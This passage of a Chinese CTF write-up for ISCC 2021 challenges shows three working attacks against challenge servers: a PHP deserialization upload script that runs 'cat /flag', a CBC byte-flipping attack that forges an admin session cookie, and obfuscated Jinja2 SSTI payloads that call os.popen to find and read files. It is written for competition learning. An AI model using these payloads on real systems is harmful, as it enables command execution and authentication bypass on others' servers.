class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>通过python脚本上传，注意图片不能太大</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://39.96.91.106:7050/&quot;</span><br><br>files=&#123;<br>    <span class="hljs-string">&#x27;iscc_file&#x27;</span>:(<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;atkx.jpg&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)),<br>    <span class="hljs-string">&quot;_SESSION&quot;</span>:(<span class="hljs-string">&quot;isccIsCciScc1scc&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>)<br>&#125;<br>headers=&#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&quot;XDEBUG_SESSION=PHPSTORM&quot;</span><br>&#125;<br>r=requests.post(url=url+<span class="hljs-string">&quot;??=O%3A11%3A%22ISCC_Upload%22%3A1%3A%7BS%3A1%3A%22a%22%3BO%3A13%3A%22ISCC_ReSetCMD%22%3A2%3A%7BS%3A10%3A%22%00%5C2a%00new_cmd%22%3BS%3A9%3A%22cat+%2Fflag%22%3BS%3A1%3A%22b%22%3BO%3A12%3A%22ISCC_Command%22%3A0%3A%7B%7D%7D%7D&quot;</span>,files=files,headers=headers)<br><br>print(r.text)<br></code></pre></td></tr></table></figure><p>得到flag<br><img src="https://img-blog.csdnimg.cn/20210505151511508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="ISCC客服一号冲冲冲（二）"><a href="#ISCC客服一号冲冲冲（二）" class="headerlink" title="ISCC客服一号冲冲冲（二）"></a>ISCC客服一号冲冲冲（二）</h2><blockquote><p>经过激烈的竞争，客服一号终于通过自己的努力（选手的帮助），保住了自己的饭碗（获得了客服的密码），可当他打开客服登录窗口，却发现怎么也登不上去了。<br>你能帮他看看怎么回事吗？ 题目入口：<a href="http://39.96.91.106:8210/">http://39.96.91.106:8210/</a> Flag格式：iscc{XXX}</p></blockquote><p>查看源码，看到login.bmp，下载</p><p>蓝色通道最低位有异常，另存为login.html<br><img src="https://img-blog.csdnimg.cn/20210511231815173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>define(<span class="hljs-string">&quot;SECRET_KEY&quot;</span>, <span class="hljs-string">&#x27;101010031231243214&#x27;</span>);<br>define(<span class="hljs-string">&quot;METHOD&quot;</span>, <span class="hljs-string">&quot;aes-128-cbc&quot;</span>);<br>session_start();<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_random_iv</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$random_iv</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$random_iv</span>.=chr(rand(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$random_iv</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span>&#123;<br>    <span class="hljs-variable">$iv</span> = get_random_iv();<br>    <span class="hljs-variable">$plain</span> = serialize(<span class="hljs-variable">$info</span>);<br>    <span class="hljs-variable">$cipher</span> = openssl_encrypt(<span class="hljs-variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    setcookie(<span class="hljs-string">&quot;iv&quot;</span>, base64_encode(<span class="hljs-variable">$iv</span>));<br>    setcookie(<span class="hljs-string">&quot;cipher&quot;</span>, base64_encode(<span class="hljs-variable">$cipher</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_login</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cipher&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;iv&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$cipher</span> = base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cipher&#x27;</span>]);<br>        <span class="hljs-variable">$iv</span> = base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;iv&quot;</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$plain</span> = openssl_decrypt(<span class="hljs-variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>))&#123;<br>            <span class="hljs-variable">$info</span> = unserialize(<span class="hljs-variable">$plain</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.base64_encode(<span class="hljs-variable">$plain</span>).<span class="hljs-string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ERROR!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_homepage</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]===<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;password&quot;</span>]=== password)<br>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Hello admin&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Flag is &#x27;</span>.flag.<span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;<br>    &#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;password&quot;</span>] == password)<br>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;hello &#x27;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You can\&#x27;t see flag&lt;/p&gt;&#x27;</span>;<br>    &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Sorry,password is incorrect&lt;/p&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$info</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>,<span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-variable">$password</span>);<br>        login(<span class="hljs-variable">$info</span>);<br>        show_homepage();<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]))&#123;<br>        check_login();<br>        show_homepage();<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;body class=&quot;login-body&quot;&gt;</span><br><span class="hljs-string">                &lt;div id=&quot;wrapper&quot; style = &quot;width:800px; height:200px; overflow:hidden;&quot;&gt;</span><br><span class="hljs-string">                    &lt;img class=&quot;img1&quot; src=&quot;login.bmp&quot;  alt=&quot;login&quot; /&gt;</span><br><span class="hljs-string">                &lt;/div&gt;</span><br><span class="hljs-string">            &lt;/body&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>阅读源代码，我们可以知道，只有admin用户才能读取flag，但是admin用户又不允许登录。虽然相互矛盾，由于题目用到了aes的cbc模式加密，所以我们可以利用cbc字节翻转攻击来得到我们想要的明文。</p><p><strong>Bugku Login4</strong>原题，考查CBC字节翻转攻击</p><p>这是组合题,猜测密码是（一）的flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">POST<br>username=admix&amp;password=<span class="hljs-number">1</span>SCC_2o2l_KeFuu&amp;submit=Login<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210513123828790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目将用户名密码传入数组并序列化得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admil&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;1SCC_2o2l_KeFuu&quot;</span>;<br></code></pre></td></tr></table></figure><p>接下来进行aes加密，并将得到的cipher和iv进行base64编码放入cookie中(cookie对于攻击者来说可控，所以存在cbc字节翻转攻击)</p><p>明文加密时分组为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;userna</span><br><span class="hljs-string">me&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admil&quot;</span>;<br>s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s<br>:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;1SCC_2o2l_K</span><br><span class="hljs-string">eFuu&quot;</span>;&#125;　<br></code></pre></td></tr></table></figure><p>因此我们只需要将”x”字节翻转为”n”即可得到flag。</p><p>根据我们得到的关系，已知只需修改前一组密文即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$newcipher</span>[<span class="hljs-number">13</span>]=chr(ord(<span class="hljs-number">13</span>) ^ ord(‘x’) ^ ord(‘n’))<br></code></pre></td></tr></table></figure><p>这时我们就会得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;1SCC_2o2l_KeFuu&quot;</span>;<br></code></pre></td></tr></table></figure><p>但是由于前一组密文被修改了 所以前一组的明文会出现乱码，因此接下来我们再生成新的iv将前一组明文改回a:2:{s:8:”userna 即可得到flag。</p><p>下面开始操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-comment">#计算cipher</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">明文1：a:2:&#123;s:8:&quot;userna//r</span><br><span class="hljs-comment">明文2：me&quot;;s:5:&quot;admix&quot;;//l字母在第14个字节</span><br><span class="hljs-comment">明文3：s:8:&quot;password&quot;;s</span><br><span class="hljs-comment">明文4：:3:&quot;123&quot;;&#125;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-variable">$cipher</span> = base64_decode(urldecode(<span class="hljs-string">&#x27;y2x2UEGxPieluLPfmaOe7HLmJGhUASZGr4AV8o38wLK9LbccTHd125gfvWZpb6lr3T0He7kJ3t7b%2F9JXPj%2FmCm17%2BVl6eIuWs0BqoaXVDL8%3D&#x27;</span>));<br><span class="hljs-variable">$temp</span> = <span class="hljs-variable">$cipher</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">设密文1[13]=A,解密(密文2)[13]=B,明文2[13]=C,</span><br><span class="hljs-comment">将A修改为A ^ C,则:</span><br><span class="hljs-comment">A ^ B = A ^ C ^ B = B ^ B = 0 = C</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//A  C X</span><br><span class="hljs-variable">$cipher</span>[<span class="hljs-number">13</span>] = chr(ord(<span class="hljs-variable">$cipher</span>[<span class="hljs-number">13</span>]) ^ ord(<span class="hljs-string">&#x27;x&#x27;</span>) ^ ord(<span class="hljs-string">&#x27;n&#x27;</span>));<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(<span class="hljs-variable">$cipher</span>));<br><br><span class="hljs-comment">#Set-Cookie: iv=UlaTx7%2Bd%2B3R0%2BQG0wM0t%2BQ%3D%3D</span><br><span class="hljs-comment">#Set-Cookie: cipher=y2x2UEGxPieluLPfmaOe7HLmJGhUASZGr4AV8o38wLK9LbccTHd125gfvWZpb6lr3T0He7kJ3t7b%2F9JXPj%2FmCm17%2BVl6eIuWs0BqoaXVDL8%3D</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">y2x2UEGxPieluLPfmbWe7HLmJGhUASZGr4AV8o38wLK9LbccTHd125gfvWZpb6lr3T0He7kJ3t7b%<span class="hljs-number">2</span>F9JXPj%<span class="hljs-number">2</span>FmCm17%<span class="hljs-number">2</span>BVl6eIuWs0BqoaXVDL8%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>这里提示反序列化失败了<br><img src="https://img-blog.csdnimg.cn/20210513124019323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>重新计算vi</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#计算iv</span><br><span class="hljs-variable">$res</span> = base64_decode(<span class="hljs-string">&#x27;udWanuvQSROPYCexu0Urn21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiIxU0NDXzJvMmxfS2VGdXUiO30=&#x27;</span>);<span class="hljs-comment">//这里放burp放回的base64数据</span><br><span class="hljs-variable">$iv</span> = base64_decode(urldecode(<span class="hljs-string">&#x27;UlaTx7%2Bd%2B3R0%2BQG0wM0t%2BQ%3D%3D&#x27;</span>)); <span class="hljs-comment">//这里放cookie中的iv  iv=kCoJjjQMy%2BIQATaagMVpbw%3D%3D;</span><br><span class="hljs-variable">$plaintext</span> = <span class="hljs-string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span>;<br><span class="hljs-variable">$new_iv</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">16</span>; <span class="hljs-variable">$i</span> ++)&#123;<br><span class="hljs-variable">$new_iv</span> = <span class="hljs-variable">$new_iv</span> . chr(ord(<span class="hljs-variable">$iv</span>[<span class="hljs-variable">$i</span>]) ^ ord(<span class="hljs-variable">$res</span>[<span class="hljs-variable">$i</span>]) ^ ord(<span class="hljs-variable">$plaintext</span>[<span class="hljs-variable">$i</span>]));<br>&#125;<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(<span class="hljs-variable">$new_iv</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到新的iv值传过去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">irk7Yy8%<span class="hljs-number">2</span>BiF%<span class="hljs-number">2</span>FBu1N2HvpoBw%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>最终flag为<br><img src="https://img-blog.csdnimg.cn/20210513124157498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="lovely-ssti"><a href="#lovely-ssti" class="headerlink" title="lovely ssti"></a>lovely ssti</h2><p>Miao<del>Miao</del>Miao~这里有一只可爱的暹罗猫猫<br>题目入口：<a href="http://39.96.91.106:3010/">http://39.96.91.106:3010/</a></p><p>查看可用字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?xiaodouni=&#123;%<span class="hljs-built_in">print</span>%20lipsum|select|string|list%&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210522174747622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没做过多少SSTI方面的题，会单独弄篇博客总结SSTI，暂时先贴一下大师傅们的Payload吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php">?xiaodouyu=<br>&#123;%set%<span class="hljs-number">20</span>xiahua=(config|select|<span class="hljs-keyword">string</span>|<span class="hljs-keyword">list</span>)[<span class="hljs-number">24</span>]%&#125;<br>&#123;%set%<span class="hljs-number">20</span>gb=(xiahua,xiahua,dict(<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">a</span>)|<span class="hljs-title">join</span>,<span class="hljs-title">xiahua</span>,<span class="hljs-title">xiahua</span>)|<span class="hljs-title">join</span>%&#125;</span><br><span class="hljs-class"></span>&#123;%set%<span class="hljs-number">20</span>ini=(xiahua,xiahua,dict(init=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set%<span class="hljs-number">20</span>glo=(xiahua,xiahua,dict(globals=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set%<span class="hljs-number">20</span>gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set%<span class="hljs-number">20</span>oo=dict(o=a,s=a)|join%&#125;<br>&#123;%%<span class="hljs-number">20</span>set%<span class="hljs-number">20</span>so=oo[::<span class="hljs-number">-1</span>]%&#125;<br>&#123;%set%<span class="hljs-number">20</span>pp=dict(pop=a,ne=b)|join%&#125;<br>&#123;%%<span class="hljs-number">20</span>set%<span class="hljs-number">20</span>opo=pp[::<span class="hljs-number">-1</span>]%&#125;<br>&#123;%set%<span class="hljs-number">20</span>rd=(dict(read=a)|join)%&#125;<br>&#123;%<span class="hljs-keyword">print</span> config|attr(gb)|attr(ini)|attr(glo)|attr(gm)(so)|attr(opo)(<span class="hljs-string">&quot;cat /usr/?????is?here????&quot;</span>)|attr(rd)()%&#125;   <br><br><br>?xiaodouyu=<br>&#123;%set pp=(dict(pop=a))|join%&#125;<br>&#123;%set xiahua=(lipsum|select|<span class="hljs-keyword">string</span>|<span class="hljs-keyword">list</span>)|attr(pp)(<span class="hljs-number">24</span>)%&#125;<br>&#123;%set g=(lipsum|select|<span class="hljs-keyword">string</span>|<span class="hljs-keyword">list</span>)|attr(pp)(<span class="hljs-number">1</span>)%&#125;<br>&#123;%set gb=(xiahua,xiahua,g,dict(bals=a,lo=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set gm=(xiahua,xiahua,g,dict(e=a,titem=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set chcr=(lipsum|attr(gb)|attr(gm)(bl))|attr(<span class="hljs-string">&quot;ge&quot;</span><span class="hljs-string">&quot;t&quot;</span>)(<span class="hljs-string">&quot;ch&quot;</span><span class="hljs-string">&quot;r&quot;</span>)%&#125;<br>&#123;%set dian=chcr(<span class="hljs-number">46</span>)%&#125;<br>&#123;%set space=chcr(<span class="hljs-number">32</span>)%&#125;<br>&#123;%set xing=chcr(<span class="hljs-number">42</span>)%&#125;<br>&#123;%set shell=(<span class="hljs-string">&quot;cat &quot;</span>,<span class="hljs-string">&quot;requirements&quot;</span>,dian,<span class="hljs-string">&quot;txt&quot;</span>)|join%&#125;<br>&#123;%set shell2=(<span class="hljs-string">&quot;find / -name &quot;</span>,xing,<span class="hljs-string">&quot;fl&quot;</span>,<span class="hljs-string">&quot;ag&quot;</span>,xing)|join%&#125;<br>&#123;%set shell2=(<span class="hljs-string">&quot;cat /usr/fl&quot;</span>,<span class="hljs-string">&quot;ag&quot;</span>,xiahua,<span class="hljs-string">&quot;is&quot;</span>,xiahua,<span class="hljs-string">&quot;here&quot;</span>,dian,<span class="hljs-string">&quot;txt&quot;</span>)|join%&#125;<br>&#123;&#123; lipsum|attr(gb)|attr(gm)(<span class="hljs-string">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>)|attr(<span class="hljs-string">&quot;po&quot;</span><span class="hljs-string">&quot;pen&quot;</span>)(shell2)|attr(<span class="hljs-string">&quot;read&quot;</span>)()&#125;&#125;<br><br><br><br>?xiaodouyu=<br>&#123;% set xiahua=(config|<span class="hljs-keyword">string</span>)[<span class="hljs-number">14</span>]%&#125;<br>&#123;% set gb=(xiahua,xiahua,<span class="hljs-string">&quot;globals&quot;</span>,xiahua,xiahua)|join %&#125;<br>&#123;% set bl=(xiahua,xiahua,<span class="hljs-string">&quot;builtins&quot;</span>,xiahua,xiahua)|join %&#125;<br>&#123;% set cr=(lipsum|attr(gb)|attr(<span class="hljs-string">&quot;get&quot;</span>)(bl))[<span class="hljs-string">&quot;ch&quot;</span><span class="hljs-string">&quot;r&quot;</span>] %&#125;<br>&#123;% set dian=cr(<span class="hljs-number">46</span>)%&#125;<br>&#123;% set xing =cr(<span class="hljs-number">42</span>)%&#125;<br>&#123;% set shell=(<span class="hljs-string">&quot;find / -name &quot;</span>,xing,<span class="hljs-string">&quot;fla&quot;</span>,xing)|join%&#125;<br>&#123;% set shell4 = <span class="hljs-string">&quot;cat /usr/fla??is?here?txt&quot;</span>%&#125;<br>&#123;&#123;(lipsum|attr(gb)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>)|attr(<span class="hljs-string">&quot;po&quot;</span><span class="hljs-string">&quot;pen&quot;</span>)(shell4))|attr(<span 